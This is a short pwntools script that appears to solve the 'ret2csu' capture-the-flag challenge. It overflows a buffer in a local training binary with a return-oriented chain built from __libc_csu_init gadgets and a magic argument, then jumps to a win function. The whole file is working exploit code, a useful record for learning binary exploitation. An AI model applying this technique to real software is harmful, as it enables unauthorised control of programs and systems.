from pwn import *

gadget1 = 0x400880
gadget2 = 0x40089a
win = 0x4007b1

payload1 = p64(gadget2) + p64(0) + p64(1) + p64(0x600e48) + p64(0) + p64(0) + p64(0xdeadcafebabebeef) + p64(gadget1) + b'A' * 0x38 + p64(win)

r = process("./ret2csu")
pause()
r.sendlineafter(b'> ', b'A' * 0x28 + payload1)
r.interactive()
